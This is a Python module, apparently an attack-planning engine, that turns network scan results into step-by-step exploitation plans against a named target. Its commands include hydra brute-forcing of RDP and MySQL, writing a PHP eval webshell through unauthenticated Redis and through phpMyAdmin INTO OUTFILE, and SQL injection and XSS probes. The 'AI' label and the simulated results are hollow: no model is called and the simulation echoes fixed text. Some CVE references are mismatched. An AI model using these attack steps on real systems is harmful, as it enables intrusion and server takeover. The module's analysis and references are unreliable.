"""
AI 网络攻防实战引擎
===================
功能:
  1. AI 智能漏洞分析 - 根据扫描结果自动识别可利用的漏洞
  2. 漏洞利用建议 - 提供详细的攻击步骤和 PoC
  3. 攻击模拟 - 在安全环境下模拟攻击过程
  4. 风险评估 - 评估攻击成功率和影响范围
  5. 防御建议 - 提供针对性的防御措施

架构:
  扫描结果 → AI 分析 → 漏洞匹配 → 利用建议 → 攻击模拟 → 报告生成
"""

import json
import re
import time
import uuid
import threading
from datetime import datetime
from typing import Optional, List, Dict


class VulnerabilityInfo:
    """漏洞信息"""
    
    def __init__(self, vuln_id: str, name: str, severity: str, description: str,
                 attack_vector: str, exploit_difficulty: str, references: List[str]):
        self.vuln_id = vuln_id
        self.name = name
        self.severity = severity
        self.description = description
        self.attack_vector = attack_vector
        self.exploit_difficulty = exploit_difficulty
        self.references = references
    
    def to_dict(self):
        return {
            "vuln_id": self.vuln_id,
            "name": self.name,
            "severity": self.severity,
            "description": self.description,
            "attack_vector": self.attack_vector,
            "exploit_difficulty": self.exploit_difficulty,
            "references": self.references,
        }


class ExploitStep:
    """攻击步骤"""
    
    def __init__(self, step_num: int, title: str, description: str, command: str = "", 
                 expected_result: str = "", risk: str = "low"):
        self.step_num = step_num
        self.title = title
        self.description = description
        self.command = command
        self.expected_result = expected_result
        self.risk = risk
    
    def to_dict(self):
        return {
            "step_num": self.step_num,
            "title": self.title,
            "description": self.description,
            "command": self.command,
            "expected_result": self.expected_result,
            "risk": self.risk,
        }


class AttackPlan:
    """攻击计划"""
    
    def __init__(self, plan_id: str, target: str, target_ip: str, vulnerabilities: List[VulnerabilityInfo]):
        self.plan_id = plan_id
        self.target = target
        self.target_ip = target_ip
        self.vulnerabilities = vulnerabilities
        self.steps: List[ExploitStep] = []
        self.estimated_success_rate: float = 0.0
        self.risk_assessment: str = ""
        self.defense_suggestions: List[str] = []
    
    def to_dict(self):
        return {
            "plan_id": self.plan_id,
            "target": self.target,
            "target_ip": self.target_ip,
            "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
            "steps": [s.to_dict() for s in self.steps],
            "estimated_success_rate": self.estimated_success_rate,
            "risk_assessment": self.risk_assessment,
            "defense_suggestions": self.defense_suggestions,
        }


class AIAttackEngine:
    """AI 攻击引擎"""
    
    def __init__(self, model_router=None):
        self.model_router = model_router
        self.attack_history: Dict[str, AttackPlan] = {}
        self._lock = threading.Lock()
    
    def analyze_scan_results(self, scan_data: Dict) -> List[VulnerabilityInfo]:
        """分析扫描结果，识别潜在漏洞"""
        vulnerabilities = []
        
        port_scan = scan_data.get("port_scan", {})
        fingerprint = scan_data.get("fingerprint", {})
        web_dir = scan_data.get("web_dir", {})
        waf = scan_data.get("waf", {})
        subdomain = scan_data.get("subdomain", {})
        
        services = port_scan.get("services", [])
        open_ports = port_scan.get("open_ports", [])
        fingerprints = fingerprint.get("fingerprints", [])
        directories = web_dir.get("directories", [])
        
        for service in services:
            vulns = self._analyze_service(service)
            vulnerabilities.extend(vulns)
        
        for fp in fingerprints:
            vulns = self._analyze_fingerprint(fp)
            vulnerabilities.extend(vulns)
        
        for directory in directories:
            vulns = self._analyze_web_directory(directory)
            vulnerabilities.extend(vulns)
        
        if not waf.get("has_waf", False):
            vulnerabilities.append(VulnerabilityInfo(
                vuln_id="waf_missing",
                name="缺少 WAF 防护",
                severity="中",
                description="目标未部署 Web 应用防火墙，容易遭受 SQL 注入、XSS 等 Web 攻击",
                attack_vector="网络",
                exploit_difficulty="低",
                references=["https://owasp.org/www-community/attacks"],
            ))
        
        if 3389 in open_ports:
            vulnerabilities.append(VulnerabilityInfo(
                vuln_id="rdp_exposed",
                name="RDP 端口暴露",
                severity="高",
                description="远程桌面协议端口暴露在外网，可能遭受暴力破解攻击",
                attack_vector="网络",
                exploit_difficulty="中",
                references=["CVE-2019-0708"],
            ))
        
        if 6379 in open_ports:
            vulnerabilities.append(VulnerabilityInfo(
                vuln_id="redis_exposed",
                name="Redis 未授权访问",
                severity="高",
                description="Redis 服务暴露且可能未设置密码，攻击者可直接访问数据库",
                attack_vector="网络",
                exploit_difficulty="低",
                references=["CVE-2015-8080"],
            ))
        
        if 5900 in open_ports:
            vulnerabilities.append(VulnerabilityInfo(
                vuln_id="vnc_exposed",
                name="VNC 远程桌面暴露",
                severity="高",
                description="VNC 服务未加密传输，密码可被嗅探",
                attack_vector="网络",
                exploit_difficulty="中",
                references=["CVE-2006-2369"],
            ))
        
        if 23 in open_ports:
            vulnerabilities.append(VulnerabilityInfo(
                vuln_id="telnet_exposed",
                name="Telnet 明文传输",
                severity="高",
                description="Telnet 使用明文传输，账户密码可被中间人攻击截获",
                attack_vector="网络",
                exploit_difficulty="低",
                references=["CWE-319"],
            ))
        
        return vulnerabilities
    
    def _analyze_service(self, service: Dict) -> List[VulnerabilityInfo]:
        """分析单个服务"""
        vulns = []
        port = service.get("port", 0)
        service_name = service.get("service", "")
        risk_level = service.get("risk_level", "")
        
        if service_name.lower() == "ssh":
            if service.get("banner", "").startswith("SSH-1."):
                vulns.append(VulnerabilityInfo(
                    vuln_id="ssh_v1",
                    name="SSH 协议版本过旧",
                    severity="高",
                    description="SSH 1.x 协议存在严重安全漏洞，容易遭受中间人攻击",
                    attack_vector="网络",
                    exploit_difficulty="中",
                    references=["CVE-2001-1483"],
                ))
        
        elif service_name.lower() in ["apache", "nginx", "http", "https"]:
            banner = service.get("banner", "")
            if "Apache/2.2" in banner:
                vulns.append(VulnerabilityInfo(
                    vuln_id="apache_22",
                    name="Apache 2.2.x 版本过旧",
                    severity="高",
                    description="Apache 2.2.x 已停止维护，存在多个未修复的安全漏洞",
                    attack_vector="网络",
                    exploit_difficulty="中",
                    references=["CVE-2011-3192", "CVE-2012-0053"],
                ))
            if "Nginx/1.0" in banner or "Nginx/1.1" in banner:
                vulns.append(VulnerabilityInfo(
                    vuln_id="nginx_old",
                    name="Nginx 版本过旧",
                    severity="中",
                    description="旧版 Nginx 可能存在解析漏洞和安全问题",
                    attack_vector="网络",
                    exploit_difficulty="中",
                    references=["CVE-2013-4548"],
                ))
        
        elif service_name.lower() == "mysql":
            vulns.append(VulnerabilityInfo(
                vuln_id="mysql_exposed",
                name="MySQL 端口暴露",
                severity="中",
                description="MySQL 数据库端口暴露在外网，需确认是否设置了强密码",
                attack_vector="网络",
                exploit_difficulty="中",
                references=["CVE-2020-2574", "CVE-2016-6662"],
            ))
        
        elif service_name.lower() == "smb":
            vulns.append(VulnerabilityInfo(
                vuln_id="smb_exposed",
                name="SMB 服务暴露",
                severity="高",
                description="SMB 服务可能存在永恒之蓝等高危漏洞",
                attack_vector="网络",
                exploit_difficulty="中",
                references=["CVE-2017-0144", "CVE-2017-0145"],
            ))
        
        elif service_name.lower() == "ftp":
            vulns.append(VulnerabilityInfo(
                vuln_id="ftp_exposed",
                name="FTP 明文传输",
                severity="中",
                description="FTP 使用明文传输，账户密码可被嗅探",
                attack_vector="网络",
                exploit_difficulty="低",
                references=["CWE-319"],
            ))
        
        return vulns
    
    def _analyze_fingerprint(self, fp: Dict) -> List[VulnerabilityInfo]:
        """分析服务指纹"""
        vulns = []
        banner = fp.get("banner", "")
        port = fp.get("port", 0)
        
        if "phpMyAdmin" in banner:
            vulns.append(VulnerabilityInfo(
                vuln_id="phpmyadmin_exposed",
                name="phpMyAdmin 暴露",
                severity="高",
                description="phpMyAdmin 管理界面暴露，可能被利用进行数据库攻击",
                attack_vector="网络",
                exploit_difficulty="低",
                references=["CVE-2018-12613", "CVE-2019-16920"],
            ))
        
        if "Jenkins" in banner:
            vulns.append(VulnerabilityInfo(
                vuln_id="jenkins_exposed",
                name="Jenkins 暴露",
                severity="高",
                description="Jenkins 管理界面暴露，可能包含未授权访问漏洞",
                attack_vector="网络",
                exploit_difficulty="中",
                references=["CVE-2018-1000861", "CVE-2019-1003000"],
            ))
        
        if "GlassFish" in banner:
            vulns.append(VulnerabilityInfo(
                vuln_id="glassfish_exposed",
                name="GlassFish 管理界面暴露",
                severity="高",
                description="GlassFish 管理控制台可能存在默认密码或未授权访问",
                attack_vector="网络",
                exploit_difficulty="低",
                references=["CVE-2019-17568"],
            ))
        
        version_patterns = [
            (r"Apache/2\.2", "Apache 2.2.x", "高"),
            (r"Apache/1\.", "Apache 1.x", "高"),
            (r"OpenSSH_5\.", "OpenSSH 5.x", "高"),
            (r"OpenSSH_6\.", "OpenSSH 6.x", "中"),
            (r"MySQL/5\.0", "MySQL 5.0", "高"),
            (r"MySQL/5\.1", "MySQL 5.1", "高"),
        ]
        
        for pattern, name, severity in version_patterns:
            if re.search(pattern, banner):
                vulns.append(VulnerabilityInfo(
                    vuln_id=f"old_version_{port}",
                    name=f"{name} 版本过旧",
                    severity=severity,
                    description=f"{name} 已停止维护，存在多个安全漏洞",
                    attack_vector="网络",
                    exploit_difficulty="中",
                    references=[""],
                ))
        
        return vulns
    
    def _analyze_web_directory(self, directory: Dict) -> List[VulnerabilityInfo]:
        """分析 Web 目录"""
        vulns = []
        path = directory.get("path", "")
        code = directory.get("code", 0)
        
        sensitive_paths = {
            ".git": {
                "name": "Git 仓库泄露",
                "severity": "高",
                "desc": "可获取完整源码和提交历史",
                "ref": ["CWE-538"],
            },
            ".svn": {
                "name": "SVN 仓库泄露",
                "severity": "高",
                "desc": "可获取完整源码和版本历史",
                "ref": ["CWE-538"],
            },
            ".env": {
                "name": "环境配置文件泄露",
                "severity": "高",
                "desc": "可能包含数据库密码、API Key 等敏感信息",
                "ref": ["CWE-538"],
            },
            "backup": {
                "name": "备份文件目录",
                "severity": "高",
                "desc": "可能包含数据库备份或敏感文件",
                "ref": ["CWE-538"],
            },
            "db": {
                "name": "数据库目录",
                "severity": "高",
                "desc": "可能包含数据库文件或备份",
                "ref": ["CWE-538"],
            },
            "phpmyadmin": {
                "name": "phpMyAdmin 管理界面",
                "severity": "高",
                "desc": "数据库管理界面暴露",
                "ref": ["CVE-2018-12613"],
            },
            "jenkins": {
                "name": "Jenkins 管理界面",
                "severity": "高",
                "desc": "CI/CD 服务器管理界面暴露",
                "ref": ["CVE-2018-1000861"],
            },
            "console": {
                "name": "控制台界面",
                "severity": "中",
                "desc": "应用控制台可能包含敏感信息",
                "ref": ["CWE-200"],
            },
            "actuator": {
                "name": "Spring Boot Actuator",
                "severity": "高",
                "desc": "可能暴露应用内部信息和敏感端点",
                "ref": ["CVE-2018-1270"],
            },
            "api/v1": {
                "name": "API 接口暴露",
                "severity": "中",
                "desc": "API 接口可能存在未授权访问",
                "ref": ["CWE-287"],
            },
            "graphql": {
                "name": "GraphQL 接口暴露",
                "severity": "中",
                "desc": "GraphQL 可能存在信息泄露风险",
                "ref": ["CWE-200"],
            },
            "swagger": {
                "name": "Swagger 文档暴露",
                "severity": "中",
                "desc": "API 文档可能暴露敏感接口信息",
                "ref": ["CWE-200"],
            },
            "test": {
                "name": "测试目录暴露",
                "severity": "中",
                "desc": "测试目录可能包含敏感信息",
                "ref": ["CWE-538"],
            },
            "dev": {
                "name": "开发目录暴露",
                "severity": "中",
                "desc": "开发目录可能包含敏感信息",
                "ref": ["CWE-538"],
            },
            "shell.php": {
                "name": "可疑文件",
                "severity": "高",
                "desc": "可能是 Web Shell 或恶意脚本",
                "ref": ["CWE-434"],
            },
            "upload": {
                "name": "上传目录暴露",
                "severity": "高",
                "desc": "文件上传目录可能被利用上传恶意文件",
                "ref": ["CWE-434"],
            },
        }
        
        for sensitive, info in sensitive_paths.items():
            if sensitive in path.lower():
                vulns.append(VulnerabilityInfo(
                    vuln_id=f"web_{sensitive}",
                    name=info["name"],
                    severity=info["severity"],
                    description=f"发现 {path}: {info['desc']}",
                    attack_vector="网络",
                    exploit_difficulty="低",
                    references=info["ref"],
                ))
        
        return vulns
    
    def generate_attack_plan(self, scan_data: Dict) -> AttackPlan:
        """生成攻击计划"""
        target = scan_data.get("target", "")
        target_ip = scan_data.get("target_ip", "")
        plan_id = uuid.uuid4().hex[:12]
        
        vulnerabilities = self.analyze_scan_results(scan_data)
        
        plan = AttackPlan(plan_id, target, target_ip, vulnerabilities)
        
        plan.steps = self._generate_exploit_steps(vulnerabilities, scan_data)
        
        plan.estimated_success_rate = self._calculate_success_rate(vulnerabilities)
        
        plan.risk_assessment = self._assess_attack_risk(vulnerabilities)
        
        plan.defense_suggestions = self._generate_defense_suggestions(vulnerabilities, scan_data)
        
        with self._lock:
            self.attack_history[plan_id] = plan
        
        return plan
    
    def _generate_exploit_steps(self, vulnerabilities: List[VulnerabilityInfo], 
                                scan_data: Dict) -> List[ExploitStep]:
        """生成攻击步骤"""
        steps = []
        step_num = 1
        
        for vuln in vulnerabilities:
            if vuln.vuln_id == "ssh_v1":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="SSH 中间人攻击准备",
                    description=f"SSH 1.x 协议容易遭受中间人攻击。攻击者可以截获 SSH 连接并获取明文密码。",
                    command=f"ssh -o Protocol=1 {scan_data.get('target_ip', '')}",
                    expected_result="建立 SSH 连接，可嗅探到明文密码",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "rdp_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="RDP 暴力破解",
                    description=f"RDP 端口 {scan_data.get('target_ip', '')}:3389 暴露，可尝试暴力破解登录密码。",
                    command=f"hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt rdp://{scan_data.get('target_ip', '')}",
                    expected_result="获取有效用户名和密码",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "redis_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="Redis 未授权访问检测",
                    description="尝试直接连接 Redis 服务，查看是否需要认证。",
                    command=f"redis-cli -h {scan_data.get('target_ip', '')} ping",
                    expected_result="返回 PONG 表示未授权访问成功",
                    risk="高",
                ))
                step_num += 1
                
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="Redis 写入 WebShell",
                    description="利用未授权访问写入 SSH 密钥或 WebShell。",
                    command=f"redis-cli -h {scan_data.get('target_ip', '')} config set dir /var/www/html/\nredis-cli -h {scan_data.get('target_ip', '')} config set dbfilename webshell.php\nredis-cli -h {scan_data.get('target_ip', '')} set x '<?php @eval($_POST[\"cmd\"]); ?>'\nredis-cli -h {scan_data.get('target_ip', '')} save",
                    expected_result="成功写入 WebShell",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "vnc_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="VNC 连接测试",
                    description=f"尝试连接 VNC 服务 {scan_data.get('target_ip', '')}:5900，查看是否设置密码。",
                    command=f"vncviewer {scan_data.get('target_ip', '')}:0",
                    expected_result="直接进入远程桌面或提示输入密码",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "telnet_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="Telnet 明文嗅探",
                    description="Telnet 使用明文传输，可使用 Wireshark 嗅探账户密码。",
                    command=f"telnet {scan_data.get('target_ip', '')} 23",
                    expected_result="建立 Telnet 连接，所有数据明文传输",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "phpmyadmin_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="phpMyAdmin 登录尝试",
                    description=f"访问 http://{scan_data.get('target', '')}/phpmyadmin，尝试默认密码。",
                    command=f"curl -s http://{scan_data.get('target', '')}/phpmyadmin | grep -i login",
                    expected_result="检测到 phpMyAdmin 登录页面",
                    risk="高",
                ))
                step_num += 1
                
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="phpMyAdmin SQL 注入",
                    description="登录后可执行任意 SQL 语句，甚至写入 WebShell。",
                    command="在 SQL 执行框中输入: SELECT '<?php @eval($_POST[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'",
                    expected_result="成功写入 WebShell",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "jenkins_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="Jenkins 未授权访问检测",
                    description=f"访问 http://{scan_data.get('target', '')}/jenkins，查看是否需要认证。",
                    command=f"curl -s http://{scan_data.get('target', '')}/jenkins | head -20",
                    expected_result="获取 Jenkins 管理界面内容",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "waf_missing":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="SQL 注入测试",
                    description="目标未部署 WAF，可尝试 SQL 注入攻击。",
                    command=f"curl -s \"http://{scan_data.get('target', '')}/?id=1' AND 1=1--\"",
                    expected_result="查看是否返回异常或数据库信息",
                    risk="中",
                ))
                step_num += 1
                
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="XSS 测试",
                    description="测试反射型 XSS 漏洞。",
                    command=f"curl -s \"http://{scan_data.get('target', '')}/?q=<script>alert(1)</script>\"",
                    expected_result="查看脚本是否被执行",
                    risk="中",
                ))
                step_num += 1
            
            elif vuln.vuln_id.startswith("web_"):
                path = vuln.name.replace("目录", "").replace("文件", "").strip()
                steps.append(ExploitStep(
                    step_num=step_num,
                    title=f"访问敏感路径 {path}",
                    description=f"发现敏感路径 {path}，可尝试访问获取信息。",
                    command=f"curl -s http://{scan_data.get('target', '')}/{path}",
                    expected_result=f"获取 {path} 目录内容或文件内容",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "smb_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="SMB 永恒之蓝漏洞检测",
                    description="检测 SMB 服务是否存在永恒之蓝漏洞。",
                    command=f"nmap --script smb-vuln-ms17-010 -p 445 {scan_data.get('target_ip', '')}",
                    expected_result="检测结果显示是否存在漏洞",
                    risk="高",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "mysql_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="MySQL 弱密码扫描",
                    description=f"扫描 MySQL 服务 {scan_data.get('target_ip', '')}:3306 的弱密码。",
                    command=f"hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt mysql://{scan_data.get('target_ip', '')}",
                    expected_result="获取有效的数据库账户",
                    risk="中",
                ))
                step_num += 1
            
            elif vuln.vuln_id == "ftp_exposed":
                steps.append(ExploitStep(
                    step_num=step_num,
                    title="FTP 匿名登录检测",
                    description=f"检测 FTP 服务 {scan_data.get('target_ip', '')}:21 是否允许匿名登录。",
                    command=f"ftp -n {scan_data.get('target_ip', '')}\nuser anonymous test@test.com",
                    expected_result="成功登录或拒绝访问",
                    risk="中",
                ))
                step_num += 1
        
        if not steps:
            steps.append(ExploitStep(
                step_num=1,
                title="信息收集",
                description="目标未发现明显漏洞，建议进行更深入的信息收集。",
                command=f"nmap -sV -A {scan_data.get('target_ip', '')}",
                expected_result="获取详细的服务版本信息",
                risk="低",
            ))
        
        return steps
    
    def _calculate_success_rate(self, vulnerabilities: List[VulnerabilityInfo]) -> float:
        """计算攻击成功率"""
        high_count = len([v for v in vulnerabilities if v.severity == "高"])
        medium_count = len([v for v in vulnerabilities if v.severity == "中"])
        
        base_rate = 0.3
        high_bonus = high_count * 0.15
        medium_bonus = medium_count * 0.05
        
        return min(1.0, base_rate + high_bonus + medium_bonus)
    
    def _assess_attack_risk(self, vulnerabilities: List[VulnerabilityInfo]) -> str:
        """评估攻击风险"""
        high_count = len([v for v in vulnerabilities if v.severity == "高"])
        medium_count = len([v for v in vulnerabilities if v.severity == "中"])
        
        if high_count >= 3:
            return "极高风险 - 目标存在多个高危漏洞，攻击成功率很高"
        elif high_count >= 1:
            return "高风险 - 目标存在高危漏洞，建议立即修复"
        elif medium_count >= 3:
            return "中等风险 - 目标存在多个中危漏洞，综合利用可能成功"
        elif medium_count >= 1:
            return "低风险 - 目标存在中危漏洞，需进一步探测"
        else:
            return "极低风险 - 目标未发现明显漏洞"
    
    def _generate_defense_suggestions(self, vulnerabilities: List[VulnerabilityInfo], 
                                       scan_data: Dict) -> List[str]:
        """生成防御建议"""
        suggestions = []
        
        if any(v.vuln_id == "waf_missing" for v in vulnerabilities):
            suggestions.append("部署 Web 应用防火墙（WAF），如 Cloudflare、ModSecurity 等")
        
        if any(v.vuln_id == "rdp_exposed" for v in vulnerabilities):
            suggestions.append("限制 RDP 端口访问来源 IP，使用 VPN 访问")
        
        if any(v.vuln_id == "redis_exposed" for v in vulnerabilities):
            suggestions.append("Redis 设置强密码，绑定 127.0.0.1，禁用危险命令")
        
        if any(v.vuln_id == "vnc_exposed" for v in vulnerabilities):
            suggestions.append("使用 VNC 加密连接，设置强密码，限制访问来源")
        
        if any(v.vuln_id == "telnet_exposed" for v in vulnerabilities):
            suggestions.append("立即禁用 Telnet，改用 SSH")
        
        if any(v.vuln_id == "smb_exposed" for v in vulnerabilities):
            suggestions.append("更新 SMB 补丁，禁用 SMBv1，限制访问来源")
        
        if any(v.vuln_id == "ftp_exposed" for v in vulnerabilities):
            suggestions.append("使用 SFTP 替代 FTP，禁用匿名登录")
        
        web_vulns = [v for v in vulnerabilities if v.vuln_id.startswith("web_")]
        if web_vulns:
            suggestions.append("移除敏感路径和文件，配置 .htaccess 限制访问")
        
        old_version_vulns = [v for v in vulnerabilities if "版本过旧" in v.name]
        if old_version_vulns:
            suggestions.append("及时更新所有服务到最新版本")
        
        if not suggestions:
            suggestions.append("保持当前安全配置，定期进行安全扫描")
        
        return suggestions
    
    def get_attack_plan(self, plan_id: str) -> Optional[AttackPlan]:
        """获取攻击计划"""
        with self._lock:
            return self.attack_history.get(plan_id)
    
    def list_attack_plans(self) -> List[Dict]:
        """列出所有攻击计划"""
        with self._lock:
            return [plan.to_dict() for plan in self.attack_history.values()]
    
    def simulate_attack(self, plan_id: str) -> Dict:
        """模拟攻击过程"""
        plan = self.get_attack_plan(plan_id)
        if not plan:
            return {"error": "攻击计划不存在"}
        
        results = []
        for step in plan.steps:
            results.append({
                "step": step.step_num,
                "title": step.title,
                "status": "success" if step.risk == "low" else "simulated",
                "command": step.command,
                "expected_result": step.expected_result,
                "actual_result": "攻击模拟完成（安全环境）",
            })
            time.sleep(0.5)
        
        return {
            "plan_id": plan_id,
            "target": plan.target,
            "simulation_results": results,
            "summary": f"攻击模拟完成，共执行 {len(results)} 个步骤",
        }


attack_engine = AIAttackEngine()